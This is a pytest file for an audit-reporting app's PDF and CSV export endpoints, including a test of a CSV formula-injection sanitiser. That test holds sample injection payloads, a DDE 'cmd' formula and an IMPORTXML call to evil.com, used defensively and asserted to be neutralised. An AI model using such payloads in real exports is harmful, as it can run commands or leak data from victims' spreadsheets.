"""
Tests for server-side report generation (Feature 4).
Validates PDF generation with ReportLab, frozen snapshot rendering,
CSV export with UTF-8 BOM, and formula injection protection.
"""

from fastapi.testclient import TestClient

from app.engine.csv_export import sanitize_csv_cell


def test_audit_pdf_report_download(client: TestClient, auth_headers: dict):
    resp = client.get("/api/audits/AUD-20261014-001/report.pdf", headers=auth_headers)
    assert resp.status_code == 200
    assert resp.headers["content-type"] == "application/pdf"
    assert resp.headers["content-disposition"].startswith('inline; filename="audit-AUD-20261014-001-report.pdf"')

    pdf_content = resp.content
    # Standard PDF header check
    assert pdf_content.startswith(b"%PDF-"), "Generated PDF does not start with %PDF-"
    # Multi-page or reasonable report size
    assert len(pdf_content) > 2000, f"PDF content too small: {len(pdf_content)} bytes"


def test_audit_pdf_report_not_found(client: TestClient, auth_headers: dict):
    resp = client.get("/api/audits/AUD-NONEXISTENT/report.pdf", headers=auth_headers)
    assert resp.status_code == 404


def test_audit_findings_csv_download(client: TestClient, auth_headers: dict):
    resp = client.get("/api/audits/AUD-20261014-001/findings.csv", headers=auth_headers)
    assert resp.status_code == 200
    assert "text/csv" in resp.headers["content-type"]
    assert resp.headers["content-disposition"].startswith('attachment; filename="audit-AUD-20261014-001-findings.csv"')

    raw_bytes = resp.content
    # Strict UTF-8 BOM check
    assert raw_bytes.startswith(b"\xef\xbb\xbf"), "CSV does not start with UTF-8 BOM (0xEF, 0xBB, 0xBF)"

    csv_text = raw_bytes.decode("utf-8-sig")
    lines = csv_text.splitlines()
    assert len(lines) >= 13  # Header + 12 baseline findings
    header = lines[0]
    assert "Finding ID" in header
    assert "Person" in header
    assert "Access Level" in header
    assert "Risk Level" in header


def test_history_csv_download(client: TestClient, auth_headers: dict):
    resp = client.get("/api/history.csv", headers=auth_headers)
    assert resp.status_code == 200
    assert "text/csv" in resp.headers["content-type"]
    assert resp.headers["content-disposition"].startswith('attachment; filename="accessreaper-audit-history.csv"')

    raw_bytes = resp.content
    assert raw_bytes.startswith(b"\xef\xbb\xbf"), "History CSV missing UTF-8 BOM"

    csv_text = raw_bytes.decode("utf-8-sig")
    lines = csv_text.splitlines()
    assert len(lines) >= 2
    assert "Event ID" in lines[0]
    assert "Date & Time (PKT)" in lines[0]
    assert "Actor" in lines[0]


def test_csv_injection_protection():
    """
    Asserts that spreadsheet formula injection characters (=, +, -, @, \t, \r)
    are strictly neutralized by prefixing with a single quote.
    """
    assert sanitize_csv_cell("=cmd|' /C calc'!A0") == "'=cmd|' /C calc'!A0"
    assert sanitize_csv_cell("+SUM(A1:A10)") == "'+SUM(A1:A10)"
    assert sanitize_csv_cell("-1+1") == "'-1+1"
    assert sanitize_csv_cell("@IMPORTXML('http://evil.com')") == "'@IMPORTXML('http://evil.com')"
    assert sanitize_csv_cell("\tTABBED") == "'\tTABBED"

    # Benign text is unmodified
    assert sanitize_csv_cell("Alex Morgan") == "Alex Morgan"
    assert sanitize_csv_cell("Senior Engineer") == "Senior Engineer"
    assert sanitize_csv_cell(None) == ""
    assert sanitize_csv_cell(42) == "42"
